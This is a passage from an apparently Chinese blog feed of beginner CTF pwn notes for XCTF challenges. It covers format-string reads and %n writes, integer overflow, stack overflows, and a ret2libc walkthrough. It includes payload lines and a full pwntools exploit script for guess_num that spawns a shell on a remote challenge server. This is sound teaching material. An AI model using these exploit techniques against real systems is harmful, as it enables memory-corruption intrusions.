class="line">&#125;</span><br></pre></td></tr></table></figure><p>假如我们输入的字符串是“%x%x%x”</p><p><img src="/images/zj27.png" alt="zj27"></p><p>可以看到本意是想输出字符串“%x%x%x”,却输出了内存中的一段地址</p><p>再看看printf函数的堆栈图：（参数从右向左入栈）</p><p><img src="/images/zj28.png" alt="zj28"></p><p><img src="/images/zj29.png" alt="zj29"></p><p><strong>printf函数并不知道参数的个数，它只会通过指针去搜索格式化字符串，然后根据格式化字符串的类型输出相应参数的值，直到搜索完最后一个格式化字符串</strong></p><p>所以尽管没有参数，也会将format string 后面的内存当做参数以16进制输出。这样就会造成内存泄露。</p><h2><span id="任意内存的读取及任意内存写入">任意内存的读取及任意内存写入</span></h2><p>任意的内存的读取需要用到格式化字符串 <strong>%s</strong>，其对应的参量是一个指向<strong>字符串首地址</strong>的指针，作用是<strong>输出这个字符串</strong>。</p><p><strong>局部变量是存储在栈中的</strong></p><p>例如：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">#include&lt;stdio.h&gt;</span><br><span class="line">#include&lt;stdlib.h&gt;</span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">  char a[100];</span><br><span class="line">  scanf(&quot;%s&quot;,a);</span><br><span class="line">  printf(a);</span><br><span class="line">  system(&quot;pause&quot;);</span><br><span class="line">  return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以得到：</p><p><img src="/images/zj30.png" alt="zj30"></p><p>看下堆栈图：<br> 这是调用scanf函数前的堆栈图。</p><p><img src="/images/zj32.png" alt="zj32"></p><p>输入字符串后的堆栈图：</p><p><img src="/images/zj31.png" alt="zj31"></p><p>调用printf函数的过程：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mov eax，数组首地址</span><br><span class="line">push eax  </span><br><span class="line">call printf</span><br></pre></td></tr></table></figure><p>该过程只是将数组的首地址入栈，此时堆栈图如下。</p><p><img src="/images/zj33.png" alt="zj33"></p><p>所以在格式化字符串里用很多的%x 就一定可以找到这个AAAA的位置。我们将这个位置记下来，实例中就是第七个%x的位置，即第7个参数。</p><p>这里说下可以直接读取第七个参数的方法。（在linux下有用，win下没用）<br> %&lt; number&gt;$x 是直接读取第number个位置的参数，同样可以用在%n，%d等等。<br> 但是需要注意64位程序，前6个参数是存在寄存器中的，从第7个参数开始才会出现在栈中，所以栈中从格式化字符串开始的第一个，应该是%7 $n</p><h3><span id="修改内存">修改内存</span></h3><p><img src="/images/zj34.png" alt="zj34"></p><p>得到b的地址</p><p><img src="/images/zj35.png" alt="zj35"></p><p>这里是第九个参数。<br> 接着用shellcode编码将b的地址写入，并查看能否写入成功。</p><p><img src="/images/zj36.png" alt="zj36"></p><p>用%n修改其值。</p><p><img src="/images/zj37.png" alt="zj37"></p><p>因为%n之前打印了75个字符，所以这里将b的值从0修改为75</p><p><strong>你也可以通过%&lt; number &gt;$n 来直接修改第九个参数来修改b的值</strong>。</p><p><img src="/images/zj38.png" alt="zj38"></p><p>在%n之前打印了4个字符，所以b的值直接被修改为4了</p><p><strong><em>例题：攻防世界CGfsb</em></strong></p><p><img src="/images/zj17.png" alt="zj17"></p><p><img src="/images/zj18.png" alt="zj18"></p><p>pwnme为8时就能拿到flag，问题是并没有能输入pwnme的地方</p><p>但是pwnme的上方有一个printf（&amp;s）明显的格式化字符串漏洞，可以以此来改变pwnme的值</p><p>看看偏移值：</p><p><img src="/images/zj19.png" alt="zj19"></p><p>可以看出偏移值是10</p><p>上exp：</p><p><img src="/images/zj20.png" alt="zj20"></p><p>注意%10$n处要加引号</p><h1><span id="0x07-strcpy漏洞">0x07 strcpy漏洞</span></h1><p>参考：<a href="https://blog.csdn.net/bjbz_cxy/article/details/80388908">https://blog.csdn.net/bjbz_cxy/article/details/80388908</a></p><p>strcpy是标准C库函数，不会去检查越界问题，所以它可以直接将内存中的值修改</p><h1><span id="0x08-整数溢出">0x08 整数溢出</span></h1><p>参考:<a href="https://zhuanlan.zhihu.com/p/28563004">https://zhuanlan.zhihu.com/p/28563004</a></p><p>整数分为有符号和无符号</p><p>异常情况有三种：①溢出   ②回绕   ③截断</p><h2><span id="溢出">溢出</span></h2><p>表现在有符号整数上，有符号整数有正值、负值和零，有向上溢出和向下溢出两种。假设用k个字节表示一个整型变量, 那么这个变量可以表示的有符号整数的范围是-2^(8k-1) ~ 2^(8k-1) –  1,那么两个正整数或者两个负整数相加就有可能超过这个整型变量所能表示的范围, 向上超出&gt;2^(8k-1) – 1我们称之为向上溢出,  向下超出&lt;-2^(8k-1), 我们称之为向下溢出. </p><p>对于signed char,正整数最大值为127，负整数最小值为128。unsigned char所能表示的最大值为255。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">signed char x;</span><br><span class="line">x &#x3D; 125 + 5;</span><br></pre></td></tr></table></figure><p>上面代码会输出：-126，因为130的二进制位为10000010，符号为1，表示负数。对于有符号整型，负数是用补码表示的，即绝对值取反后加一。根据之前方法逆向回去，先减一后再取反得01111110，即126.所以10000010表示的是-126。</p><h2><span id="回绕">回绕</span></h2><p>溢出后的数会以2^(8*sizeof(type))作模运算</p><p>例如一个unsigned char（1字符，8bits）溢出了，会把溢出的值与256求模</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">int main() &#123;</span><br><span class="line">  unsigned char x;</span><br><span class="line">  x &#x3D; 128 + 130;</span><br><span class="line">  printf(&quot;%d\n&quot;,x);  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>会输出2，因为258%256=2</p><h2><span id="截断">截断</span></h2><p>将一个较大宽度的数存入较小宽度的操作数中时，高位会发生截断（一般只取后八位）</p><p><strong><em>例题：攻防世界int_overflow</em></strong></p><p><a href="https://makabaka-yyds.github.io/2021/01/27/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cpwn%E6%96%B0%E6%89%8Bint_overflow/">详情见</a></p><h1><span id="0x09-dynelf">0x09 DynELF</span></h1><p>具体原理见：</p><p><a href="https://bbs.ichunqiu.com/forum.php?mod=viewthread&amp;tid=42933&amp;ctid=157">https://bbs.ichunqiu.com/forum.php?mod=viewthread&amp;tid=42933&amp;ctid=157</a></p><p><a href="https://www.anquanke.com/post/id/85129">【技术分享】借助DynELF实现无libc的漏洞利用小结 - 安全客，安全资讯平台 (anquanke.com)</a></p><p><strong><em>例题：攻防世界pwn100</em></strong></p><p>详情见其他博客</p><h1><span id="0x10-万能gadget">0x10 万能gadget</span></h1><p><a href="https://xz.aliyun.com/t/5597#toc-1">万能gadget</a></p><p><strong><em>例题：攻防世界pwn100</em></strong></p><p>详情见其他博客</p><h1><span id="0x0n-杂七杂八">0x0N  杂七杂八</span></h1><h2><span id="0x001-地址查找函数">0x001 地址查找函数</span></h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">前提：elf &#x3D; ELF（&#39;level2&#39;）</span><br><span class="line">sys_addr &#x3D; elf.symbols[&#39;system&#39;]#在elf这个文件中查找system函数的地址</span><br><span class="line">sh_addr  &#x3D; elf.search(&#39;&#x2F;bin&#x2F;sh&#39;).next()#在文件中查找写有字符串“&#x2F;bin&#x2F;sh”的地址</span><br></pre></td></tr></table></figure><h2><span id="0x002-关于systembinsh">0x002 关于system(/bin/sh)</span></h2><p>system（）函数调用的是地址</p><p>/bin/sh只是一个字符串，所以在 f12+shift 以及查找函数查出来的都是写有 “/bin/sh” 这个内容的地址</p><h2><span id="0x003-关于rand和srand">0x003 关于rand和srand</span></h2><p>随机函数生成的随机数并不是真的随机数，他们只是在一定范围内随机，实际上是一段数字的循环，这些数字取决于随机种子。在调用rand()函数时，必须先利用srand()设好随机数种子，如果未设随机数种子，rand()在调用时会自动设随机数种子为1。<br><strong><em>例题：攻防世界guess_num</em></strong></p><p><img src="/images/zj21.png" alt="zj21"></p><p><img src="/images/zj22.png" alt="zj22"></p><p><img src="/images/zj23.png" alt="zj23"></p><p>gets的输出漏洞，v6是一个随机数，后面有一个判断，如果v4能与v6相等，那么就能拿到flag，而正好我们可以通过gets输出漏洞控制seed[0]让它每次产生的随机数都能被我们预知</p><h5><span id="关于ctype库与dll">关于ctype库与dll</span></h5><p>我们使用python标准库中自带的ctypes模块进行python和c的混合编程</p><h5><span id="libc共享库">libc共享库</span></h5><p>可以使用ldd查找</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">kk@ubuntu:~&#x2F;Desktop&#x2F;black&#x2F;GFSJ&#x2F;guess_num$ ldd guess_num </span><br><span class="line">    linux-vdso.so.1 &#x3D;&gt;  (0x00007ffd3f5a0000)</span><br><span class="line">    libc.so.6 &#x3D;&gt; &#x2F;lib&#x2F;x86_64-linux-gnu&#x2F;libc.so.6 (0x00007f1e6c0b0000)</span><br><span class="line">    &#x2F;lib64&#x2F;ld-linux-x86-64.so.2 (0x00007f1e6c67d000)</span><br></pre></td></tr></table></figure><p>也可以在脚本中通过elf文件查找</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">elf &#x3D; ELF(&#39;.&#x2F;guess_num&#39;)</span><br><span class="line">libc &#x3D; elf.libc</span><br></pre></td></tr></table></figure><p>exp：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">from pwn import*</span><br><span class="line">from ctypes import*</span><br><span class="line">p &#x3D; remote(&#39;111.200.241.243&#39;,56846)</span><br><span class="line"></span><br><span class="line">libc &#x3D; cdll.LoadLibrary(&quot;&#x2F;lib&#x2F;x86_64-linux-gnu&#x2F;libc.so.6&quot;)</span><br><span class="line">p.recvuntil(&quot;Your name:&quot;)</span><br><span class="line">payload &#x3D; &#39;a&#39;*(0x30-0x10) + p64(1)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">libc.srand(1)</span><br><span class="line">for i in range(10):      #循环写法（循环10次）</span><br><span class="line">   num &#x3D; str(libc.rand()%6+1)</span><br><span class="line">   p.recvuntil(&quot;number:&quot;)</span><br><span class="line">   p.sendline(num)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2><span id="0x004-text-data-bss等的区别">0x004 .text .data .bss等的区别</span></h2><p> 原博客：<a href="https://blog.csdn.net/qq_27350133/article/details/103796444">https://blog.csdn.net/qq_27350133/article/details/103796444</a></p><ul><li><p>.text段是代码段。它用来放程序代码（code）。它通常是只读的（程序代码，编译好了就确定了，不可能改来改去的嘛）。</p></li><li><p>.data(ZI data)段是数据段。它用来存放初始化了的（initailized）全局变量（global）和初始化了的静态变量（static）。它是可读可写的。</p></li><li><p>.bss(RW data )段是全局变量数据段。它用来存放未初始化的（uninitailized）全局变量（global）和未初始化的静态变量</p><p>例如：</p></li></ul><p><img src="/images/IDA1.png" alt="IDA1"></p><p><img src="/images/IDA2.png" alt="IDA2"></p><p>代表pwnme（未初始化的全局变量）的地址</p><p><img src="/images/IDA3.png" alt="IDA3"></p><p>代表将ds赋值给eax寄存器的程序代码的地址</p><h2><span id="0x005-p3264与u3264的区别">0x005 p32（64）与u32（64）的区别</span></h2><p>p32是人发给机器</p><p>u32是机器发给机器</p><h2><span id="0x006-precv4与precv4的区别">0x006 p.recv(4)与p.recv()[:4]的区别</span></h2><p>p.recv(4)表示接受字符数为4</p><p>p.recv()[:4]表示接收到第四个字符</p><p>p.recv()[2:4]表示从第二个字符接收到第四个字符</p><p>p.recv()[:-1]表示一直接收</p><p>p.recvuntil(\n)[:-1]代表接收除去\n的所有数</p><h2><span id="0x007">0x007</span></h2><p>str()将括号内的东西打包成字符串</p><p>int( ,16)将括号内东西打包成16进制数</p><h2><span id="0x008-寄存器与偏移地址">0x008 寄存器与偏移地址</span></h2><p><strong>什么是寄存器？</strong></p><p>给有特定功能的内存单元取一个别名，这个别名就是我们经常说的寄存器。</p><p><strong>什么是寄存器映射？</strong></p><p>给存储器分配地址的过程叫存储器映射，再分配一个地址叫重映射。</p><p><strong>什么是偏移地址？</strong></p><p>偏移地址是计算机里的内存分段后，在段内某一地址相对于段首地址（段地址）的偏移量。偏移地址也成为偏移量</p><p>有效地址 = 基地址 + 偏移地址</p><h2><span id="0x009-readelf">0x009 readelf</span></h2><p>用于解析ELF格式目标文件的信息</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">readelf -s libc_32.so.6|grep 函数名</span><br></pre></td></tr></table></figure><p>可查找函数在libc中的地址</p><p>不同的 ”-x“会有不同的用法</p><h2><span id="0x010-strings">0x010 strings</span></h2><p>用于在二进制文件中（ELF）查找可打印的字符串</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">strings -at x libc_32.so.6|grep &#x2F;bin&#x2F;sh</span><br></pre></td></tr></table></figure><p>可查找”/bin/sh“的地址</p>]]></content>
      
      
      
        <tags>
            
            <tag> PWN </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>攻防世界pwn新手string</title>
      <link href="/2021/01/31/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cpwn%E6%96%B0%E6%89%8Bstring/"/>
      <url>/2021/01/31/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cpwn%E6%96%B0%E6%89%8Bstring/</url>
      
        <content type="html"><![CDATA[<p>我是懒狗，不想码字了（希望我哪天能心血来潮把这个题自己写一遍）</p><p>看了学长的wp感觉讲的挺好的就用他的吧</p><p><a href="https://chenqiw.netlify.app/2020/03/20/string/">https://chenqiw.netlify.app/2020/03/20/string/</a></p><p>主要还是格式化字符串的漏洞，让两个数相等</p><p>还涉及到了shellcode的写法，以及如何获取已输出的值（个人理解）【exp中涉及到了两种方法】</p><p>感觉好多知识点都是只可意会不可言传qwq(果然这就是语文不好的悲伤吗555)</p><p>上exp:(有一些东西和学长写的不一样但是目的都是一样的)</p><p><img src="/images/string1.png" alt="string1"></p>]]></content>
      
      
      
        <tags>
            
            <tag> PWN </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>攻防世界pwn新手总结</title>
      <link href="/2021/01/31/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cpwn%E6%96%B0%E6%89%8B%E6%80%BB%E7%BB%93/"/>
      <url>/2021/01/31/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cpwn%E6%96%B0%E6%89%8B%E6%80%BB%E7%BB%93/</url>
      
        <content type="html"><![CDATA[<p>芜湖！终于全都肝完了</p><p><img src="/images/zj1.png" alt="zj1"></p><p>菜鸡学PWN总算看到门了，那就把每道题好好过一遍</p><p>参考地址：<a href="https://www.jianshu.com/p/0bc6c65addfd">https://www.jianshu.com/p/0bc6c65addfd</a></p><h1><span id="0x01-get_shell">0x01 get_shell</span></h1><p><img src="/images/zj2.png" alt="zj2"></p><p>提示说运行就能拿到shell    运行后直接nc即可</p><p><img src="/images/zj3.png" alt="zj3"></p><h1><span id="0x02-hello_pwn">0x02 hello_pwn</span></h1><p><img src="/images/zj4.png" alt="zj4"></p><p><img src="/images/zj5.png" alt="zj5"></p><p><img src="/images/zj6.png" alt="zj6"></p><p>可以看到unk_601068允许输入的长度是10，而unk_601068和dword_60106C在.bss段相差4（6c-68）</p><p>于是可以想到在unk_601068中输入4个数覆盖掉dword_60106C再输入自己想要的值</p><p>payload = ‘a’*4 + p64(1853186401)</p><h1><span id="0x03-level0">0x03 level0</span></h1><p><img src="/images/zj7.png" alt="zj7"></p><p><img src="/images/zj8.png" alt="zj8"></p><p><img src="/images/zj9.png" alt="zj9"></p><p><img src="/images/zj10.png" alt="zj10"></p><p>可以看出没有开启栈保护，200远大于80</p><p>直接栈溢出即可</p><p>payload = ‘a’*(0x80+0x08) + p64(0x040059A)</p><h1><span id="0x04-when_did_you_born">0x04 when_did_you_born</span></h1><p><img src="/images/zj11.png" alt="zj11"></p><p>gets函数的漏洞，利用v4覆盖掉v5的地址后改为1926即可</p><p><img src="/images/zj12.png" alt="zj12"></p><h1><span id="0x05-level2">0x05 level2</span></h1><p><img src="/images/zj13.png" alt="zj13"></p><p><img src="/images/zj14.png" alt="zj14"></p><p>很明显的栈溢出</p><p>但是system（）和“/bin/sh”的地址是单独给出来的，所有要把它们合二为一</p><p>那么system（）和‘’/bin/sh“的地址怎么找呢？</p><p>一种是直接在IDA里找（菜鸡找不到，分不清是哪一个）</p><p>那么就可以用第二种方法找</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">前提：elf &#x3D; ELF（&#39;level2&#39;）</span><br><span class="line">sys_addr &#x3D; elf.symbols[&#39;system&#39;]</span><br><span class="line">sh_addr  &#x3D; elf.search(&#39;&#x2F;bin&#x2F;sh&#39;).next()</span><br></pre></td></tr></table></figure><p>所以最后的payload为：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload &#x3D; &#39;a&#39;*(0x88+0x4) + p32(sys_addr) + &#39;aaaa&#39; + p32(sh_addr)</span><br></pre></td></tr></table></figure><h1><span id="0x06-cgfsb">0x06 CGfsb</span></h1><p><img src="/images/zj17.png" alt="zj17"></p><p><img src="/images/zj18.png" alt="zj18"></p><p>pwnme为8时就能拿到flag，问题是并没有能输入pwnme的地方</p><p>但是pwnme的上方有一个printf（&amp;s）明显的格式化字符串漏洞，可以以此来改变pwnme的值</p><p>看看偏移值：</p><p><img src="/images/zj19.png" alt="zj19"></p><p>可以看出偏移值是10</p><p>上exp：</p><p><img src="/images/zj20.png" alt="zj20"></p><p>注意%10$n处要加引号</p><h1><span id="0x07-guess_num">0x07 guess_num</span></h1><p><img src="/images/zj21.png" alt="zj21"></p><p><img src="/images/zj22.png" alt="zj22"></p><p><img src="/images/zj23.png" alt="zj23"></p><p>gets的输出漏洞，v6是一个随机数，后面有一个判断，如果v4能与v6相等，那么就能拿到flag，而正好我们可以通过gets输出漏洞控制seed[0]让它每次产生的随机数都能被我们预知</p><h5><span id="关于rand和srand">关于rand和srand</span></h5><p>随机函数生成的随机数并不是真的随机数，他们只是在一定范围内随机，实际上是一段数字的循环，这些数字取决于随机种子。在调用rand()函数时，必须先利用srand()设好随机数种子，如果未设随机数种子，rand()在调用时会自动设随机数种子为1。<br> 对于该题目，我们将随机种子设置为0或1都可，参考文件中的循环来写脚本。</p><h5><span id="关于ctype库与dll">关于ctype库与dll</span></h5><p>我们使用python标准库中自带的ctypes模块进行python和c的混合编程</p><h5><span id="libc共享库">libc共享库</span></h5><p>可以使用ldd查找</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">kk@ubuntu:~&#x2F;Desktop&#x2F;black&#x2F;GFSJ&#x2F;guess_num$ ldd guess_num </span><br><span class="line">    linux-vdso.so.1 &#x3D;&gt;  (0x00007ffd3f5a0000)</span><br><span class="line">    libc.so.6 &#x3D;&gt; &#x2F;lib&#x2F;x86_64-linux-gnu&#x2F;libc.so.6 (0x00007f1e6c0b0000)</span><br><span class="line">    &#x2F;lib64&#x2F;ld-linux-x86-64.so.2 (0x00007f1e6c67d000)</span><br></pre></td></tr></table></figure><p>也可以在脚本中通过elf文件查找</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">elf &#x3D; ELF(&#39;.&#x2F;guess_num&#39;)</span><br><span class="line">libc &#x3D; elf.libc</span><br></pre></td></tr></table></figure><p>exp：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">from pwn import*</span><br><span class="line">from ctypes import*</span><br><span class="line">p &#x3D; remote(&#39;111.200.241.243&#39;,56846)</span><br><span class="line"></span><br><span class="line">libc &#x3D; cdll.LoadLibrary(&quot;&#x2F;lib&#x2F;x86_64-linux-gnu&#x2F;libc.so.6&quot;)</span><br><span class="line">p.recvuntil(&quot;Your name:&quot;)</span><br><span class="line">payload &#x3D; &#39;a&#39;*(0x30-0x10) + p64(1)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">libc.srand(1)</span><br><span class="line">for i in range(10):</span><br><span class="line">   num &#x3D; str(libc.rand()%6+1)</span><br><span class="line">   p.recvuntil(&quot;number:&quot;)</span><br><span class="line">   p.sendline(num)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h1><span id="0x08-cgpwn2">0x08 cgpwn2</span></h1><p>要自己加”/bin/sh“</p><p>详情见其他博客</p><h1><span id="0x09-int_overflow">0x09 int_overflow</span></h1><p>整数溢出+strcpy栈溢出</p><p>详情见其他博客</p><h1><span id="0x10-string">0x10 string</span></h1><p>格式化字符串漏洞+shellcode+读取输出</p><p>详情见其他博客</p><h1><span id="0x11-level3快收工啦">0x11 level3（快收工啦！）</span></h1><p>这个题对我这个菜鸡来说有点秃头</p><p>涉及到了PLT和GOT，还有libc中如何根据相对偏移地址算出有效地址等</p><p>具体详情见博客啦</p>]]></content>
      
      
      
        <tags>
            
            <tag> PWN </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>攻防世界pwn新手level3</title>
      <link href="/2021/01/30/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cpwn%E6%96%B0%E6%89%8Blevel3/"/>
      <url>/2021/01/30/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cpwn%E6%96%B0%E6%89%8Blevel3/</url>
      
        <content type="html"><![CDATA[<p>原地址：<a href="https://blog.csdn.net/zyh18851473527/article/details/98487071">https://blog.csdn.net/zyh18851473527/article/details/98487071</a></p><p> 关于PLT和GOT:<a href="https://linyt.blog.csdn.net/article/details/51635768">https://linyt.blog.csdn.net/article/details/51635768</a></p><h1><span id="前言">前言</span></h1><p>一开始在xctf上下载出来的文件长这样<img src="/images/level311.png" alt="level311"></p><p>但是移进虚拟机就变成了压缩文件，还好以前学长也遇到过这样的问题</p><p>要把文件的后缀改成压缩文件然后再解压</p><h1><span id="0x01-查壳">0x01 查壳</span></h1><p><img src="/images/level31.png" alt="level31"></p><h1><span id="0x02-丢ida">0x02 丢IDA</span></h1><p><img src="/images/level32.png" alt="level32"></p><p><img src="/images/level33.png" alt="level33"></p><h1><span id="0x03-分析">0x03 分析</span></h1><p>可以发现read存在栈溢出，分配了0x88的空间，能输入0x100的内容</p><p><img src="/images/level34.png" alt="level34"></p><p>可以发现并没有system（）函数、“/bin/sh”字符串，而且题目又给了libc，这是一个运行库文件，我们的目的是要通过它来获得两者的地址。</p><p><img src="/images/level35.png" alt="level35"></p><p>对libc进行checksec发现它开启了pie，而现代操作系统一般都开启了 ASLR  ，所以库函数在每次运行时都会被加载到不同的位置，但是由于函数间的相对位置是确定的，那么只要能知道其中一个函数的真正地址，我们就可以计算出任意库函数的地址，这里我们的目标是从 got表 中获取 write 函数的地址，所以要获得的是 system 和 “/bin/sh” 与它的相对位置。</p><p>如何获得write、system、“/bin/sh”的地址呢？</p><p>获取write、system函数地址：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">readelf -s libc_32.so.6|grep 函数名</span><br></pre></td></tr></table></figure><p><img src="/images/level36.png" alt="level36"></p><p><img src="/images/level37.png" alt="level37"></p><p>获取“/bin/sh”字符串地址：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ROPgadget --binary libc_32.so.6 --string &#39;&#x2F;bin&#x2F;sh&#39;</span><br><span class="line">或者</span><br><span class="line">strings -at x libc_32.so.6 | grep bin&#x2F;sh</span><br></pre></td></tr></table></figure><p><img src="/images/level38.png" alt="level38"></p><p><img src="/images/level39.png" alt="level39"></p><p>用system的地址减去write的地址就可以得出偏移地址为 -99a80</p><p>用“/bin/sh”的地址减去write的地址就可以得出偏移地址为 84c6b</p><p>于是可以写出第一个payload了</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload &#x3D; &#39;a&#39; * 0x8c + p32(elf.plt[&#39;write&#39;]) + p32(elf.symbols[&#39;main&#39;]) + p32(1) + p32(elf.got[&#39;write&#39;]) + p32(10)</span><br></pre></td></tr></table></figure><p>先填充payload至ret处，然后将 <code>elf.plt[&#39;write&#39;]</code> 传给ret处，使得eip指向此处执行write函数，write函数返回地址就重新指向main函数<code>p32(elf.symbols[&#39;main&#39;])</code>，使得可以重新利用main函数，可以再一次输入新的payload。然后<code>p32(1)【write所对应的是写，即是1】 + p32(elf.got[&#39;write&#39;]) + p32(10)【此处的10可以改为大于等于4的任意数（因为32位地址为4）】</code>，三个参数分别对应了write函数的三个参数，将write函数在got表中的地址泄露出来。</p><p>然后使用<code>write_addr = u32(io.recv()[:4])</code>存下输出的write函数地址。【[:4]表示的是第四个字节，整个代码表示接收输出的第四个字节本身及其之前的所有字节】</p><p>第二个payload</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload &#x3D; &#39;a&#39; * 0x8c + p32(write_addr - 0x99a80) + &#39;aaaa&#39; + p32(write_addr + 0x84c6b)</span><br></pre></td></tr></table></figure><p><code>p32(write_addr - 0x99a80)</code>就是system函数的实际地址，伪造一个随机的返回地址<code>aaaa</code>，然后传入<code>/bin/sh</code>字符串，拿到shell。</p><h1><span id="0x04-exp">0x04 exp</span></h1><p><img src="/images/level310.png" alt="level310"></p>]]></content>
      
      
      
        <tags>
            
            <tag> PWN </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>寄存器+偏移地址</title>
      <link href="/2021/01/30/%E5%AF%84%E5%AD%98%E5%99%A8-%E5%81%8F%E7%A7%BB%E5%9C%B0%E5%9D%80/"/>
      <url>/2021/01/30/%E5%AF%84%E5%AD%98%E5%99%A8-%E5%81%8F%E7%A7%BB%E5%9C%B0%E5%9D%80/</url>
      
        <content type="html"><![CDATA[<p>源地址：<a href="https://blog.csdn.net/jiayoudangdang/article/details/85060376">https://blog.csdn.net/jiayoudangdang/article/details/85060376</a></p><h1><span id="什么是寄存器">什么是寄存器？</span></h1><p>给有特定功能的内存单元取一个别名，这个别名就是我们经常说的寄存器。</p><h1><span id="什么是寄存器映射">什么是寄存器映射？</span></h1><p>给存储器分配地址的过程叫存储器映射，再分配一个地址叫重映射。</p><h1><span id="什么是偏移地址">什么是偏移地址？</span></h1><p>偏移地址是计算机里的内存分段后，在段内某一地址相对于段首地址（段地址）的偏移量。偏移地址也成为偏移量</p><p>有效地址 = 基地址 + 偏移地址</p><h1><span id="偏移地址的计算方法">偏移地址的计算方法</span></h1><p>计算方法：当系统需要产生一个20位地址的时候,一个段寄存器会自动被选择。且自动左移4位（左移四位就是16进制后面补一个零）再与一个16位地址偏移量相加产生所需的20位地址。</p><p>例如：数据段DS寄存器的值=0088H   </p><p>偏移地址=22H  </p><p>那么生成的20位物理地址等于00880H+22H=008A2H</p>]]></content>
      
      
      
        <tags>
            
            <tag> PWN </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>格式化字符串漏洞原理详解</title>
      <link href="/2021/01/29/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86%E8%AF%A6%E8%A7%A3/"/>
      <url>/2021/01/29/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86%E8%AF%A6%E8%A7%A3/</url>
      
        <content type="html"><![CDATA[<p>地址：<a href="https://blog.csdn.net/qq_43394612/article/details/84900668">https://blog.csdn.net/qq_43394612/article/details/84900668</a></p><p>%n表示的是将之前<strong>已经打印出来的字符个数</strong>，赋值给一个变量</p>]]></content>
      
      
      
        <tags>
            
            <tag> PWN </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>攻防世界pwn新手int_overflow</title>
